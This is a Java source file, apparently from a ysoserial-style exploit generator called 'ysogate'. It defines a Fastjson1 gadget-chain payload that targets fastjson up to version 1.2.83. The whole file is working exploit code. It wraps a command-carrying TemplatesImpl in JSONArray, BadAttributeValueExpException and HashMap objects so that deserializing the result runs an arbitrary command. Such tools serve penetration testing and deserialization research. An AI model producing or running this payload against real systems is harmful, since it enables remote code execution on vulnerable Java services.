package com.h2tg.ysogate.payloads.gadgets;

import com.alibaba.fastjson.JSONArray;
import com.h2tg.ysogate.annotation.Dependencies;
import com.h2tg.ysogate.payloads.CommandObjectPayload;
import com.h2tg.ysogate.utils.Gadgets;
import com.h2tg.ysogate.utils.PayloadRunner;
import com.h2tg.ysogate.utils.Reflections;

import javax.management.BadAttributeValueExpException;
import java.util.ArrayList;
import java.util.HashMap;

@Dependencies({"com.alibaba.fastjson:<=1.2.83"})
public class Fastjson1 implements CommandObjectPayload<Object>
{
    public static void main(final String[] args) throws Exception
    {
        PayloadRunner.run(Fastjson1.class, args);
    }

    public Object getObject(final String command) throws Exception
    {
        final Object template = Gadgets.createTemplatesImpl(command);
        JSONArray jsonArray = new JSONArray();
        ArrayList arrayList = new ArrayList();
        arrayList.add(template);
        jsonArray.add(arrayList);

        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
        Reflections.setFieldValue(badAttributeValueExpException, "val", jsonArray);

        HashMap hashMap = new HashMap();
        hashMap.put(template, badAttributeValueExpException);

        return hashMap;
    }
}
